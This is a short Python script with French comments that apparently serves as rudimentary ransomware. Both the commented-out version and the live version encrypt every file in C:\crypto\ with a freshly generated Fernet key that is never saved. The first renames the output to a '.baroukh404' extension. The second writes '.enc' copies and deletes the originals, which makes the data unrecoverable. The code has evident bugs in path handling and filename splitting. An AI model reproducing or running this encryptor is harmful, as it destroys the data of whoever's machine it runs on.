"""

import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
f = Fernet(key)

# Directory with files to be encrypted
directory = "C:\\crypto\\"

for root, dirs, files in os.walk(directory):
	for file in files:
		if not file.endswith('.enc'):
			with open(os.path.join(root, file), 'rb') as f1:
				data = f1.read()

			encrypted = f.encrypt(data)

			name, _ = file.split('.')
			new_name = name + '.baroukh404'
			with open(os.path.join(root, new_name), 'wb') as f2:
				f2.write(encrypted)

"""
import os
import cryptography 
from cryptography.fernet import Fernet

key = Fernet.generate_key() # Génération d'une clé
cipher_suite = Fernet(key)

def encrypt_files():
    """Crypter et renommer tous les fichiers dans un dossier"""

    fileList = os.listdir('C:\\crypto\\')
    print("Fichiers trouvés: ", fileList)

    for eachfile in fileList:
        if eachfile.endswith(".enc"):
            # Ne pas essayer de crypter les fichiers encodés
            continue

        # Encryption du fichier
        with open(eachfile, "rb") as f:
            encrypted_data = cipher_suite.encrypt(f.read())

        # Écriture des données chiffrées dans un fichier
        with open(eachfile + ".enc", "wb") as f:
            f.write(encrypted_data)

        # Suppression de l'ancien fichier non crypté
        os.remove(eachfile)

encrypt_files()